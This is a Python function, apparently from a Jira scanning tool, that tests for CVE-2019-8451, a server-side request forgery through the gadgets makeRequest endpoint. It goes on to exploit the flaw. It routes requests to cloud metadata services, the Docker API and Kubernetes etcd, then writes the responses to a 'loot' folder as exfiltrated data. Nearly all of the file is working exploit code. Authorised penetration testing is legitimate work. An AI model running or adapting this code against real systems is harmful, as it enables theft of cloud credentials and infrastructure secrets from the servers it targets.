import requests
from urllib.parse import urlparse
from colorama import Fore, Style
import json

def check_cve_2019_8451(base_url, output_folder="loot/"):
    """
    Checks for CVE-2019-8451 (SSRF via OAuth endpoint) and extracts sensitive metadata if applicable.
    """
    print(f"\n{Fore.YELLOW}INFO: Checking for CVE-2019-8451 (SSRF){Style.RESET_ALL}")
    
    vulnerabilities = ''  # String to store discovered vulnerabilities
    headers = {
        'X-Atlassian-Token': 'no-check'
    }
    
    # Remove '/jira/' if it exists in the base_url
    base_url = base_url.replace('/jira/', '/')

    try:
        # Test SSRF with a simple payload
        ssrf_url = "example.com"
        check_url = f"{base_url.rstrip('/')}/plugins/servlet/gadgets/makeRequest?url={base_url.rstrip('/')}@{ssrf_url}"
        print(f"{Fore.BLUE}[Testing URL]{Style.RESET_ALL}: {check_url}")
        response = requests.get(check_url, headers=headers, allow_redirects=False, verify=False)

        # Check if the SSRF is successful
        if response.status_code == 200 and '"rc":200' in response.text and "Example Domain" in response.text:
            vulnerability_detail = f"+ [SSRF] Vulnerable to CVE-2019-8451 (SSRF): {check_url}"
            vulnerabilities += vulnerability_detail
            print(f"{Fore.RED}[!!] [SSRF] Vulnerable to CVE-2019-8451 (SSRF): {check_url}{Style.RESET_ALL}")
            #print(response.text)

            # Perform metadata exfiltration checks
            sensitive_urls = {
                "AWS Metadata": "169.254.169.254/latest/meta-data/",
                "Alibaba Metadata": "100.100.100.200/latest/meta-data/",
                "Docker Containers": "127.0.0.1:2375/v1.24/containers/json",
                "Kubernetes ETCD API keys": "127.0.0.1:2379/v2/keys/?recursive=true",
                "Digital Ocean Metadata":"169.254.169.254/metadata/v1.json",
                "Oracle Cloud":"192.0.0.192/latest/user-data/",
                "Tencent Cloud":"metadata.tencentyun.com/latest/meta-data/",
            }

            exfiltrated_data = {}

            for label, sensitive_url in sensitive_urls.items():
                print(f"\tChecking {label}")
                sensitive_check_url = f"{base_url.rstrip('/')}/plugins/servlet/gadgets/makeRequest?url={base_url.rstrip('/')}@{sensitive_url}"
                sensitive_response = requests.get(sensitive_check_url, headers=headers, allow_redirects=False, verify=False)

                if sensitive_response.status_code == 200 and '"rc":200' in sensitive_response.text:
                    print(f"\t----> {label} Found: {sensitive_check_url}")
                    # print(sensitive_response.text)
                    vulnerabilities += f"\n[+] [SSRF] Vulnerable to CVE-2019-8451: {label} Found: {sensitive_check_url}"
                    exfiltrated_data[label] = sensitive_response.text
                elif sensitive_response.status_code == 200 and '"rc":500' in sensitive_response.text:
                    print(f"\t----> {label} Not Found HTTP:500 ")
                    print(f"{Fore.YELLOW}\t----> HTTP Code: {sensitive_response.status_code}{Style.RESET_ALL}")
                    print(sensitive_response.text)
                else:
                    print(f"\t----> {label} Not Found")
                    print(f"{Fore.YELLOW}\t----> HTTP Code: {sensitive_response.status_code}{Style.RESET_ALL}")

            # Write exfiltrated data to file if applicable
            if exfiltrated_data and output_folder:
                filename = f"CVE-2019-8451_{urlparse(base_url).netloc}.txt"
                filepath = f"{output_folder.rstrip('/')}/{filename}"
                with open(filepath, 'w') as outfile:
                    for label, data in exfiltrated_data.items():
                        outfile.write(f"---- {label} ----\n")
                        outfile.write(data + "\n")
                print(f"\n{Fore.GREEN}Exfiltrated data written to: {filepath}{Style.RESET_ALL}")

        elif response.status_code == 200 and '"rc":403' in response.text:
            print(f"{Fore.YELLOW}- Not Vulnerable to CVE-2019-8451{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}- HTTP Code: {response.status_code}{Style.RESET_ALL}")
            # print(f"{Fore.YELLOW}- [Debug] Response Body:\n {response.text}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}- Not Vulnerable to CVE-2019-8451{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}- HTTP Code: {response.status_code}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}* An error occurred while checking {base_url}: {e}{Style.RESET_ALL}")

    return vulnerabilities  # Return the discovered vulnerabilities
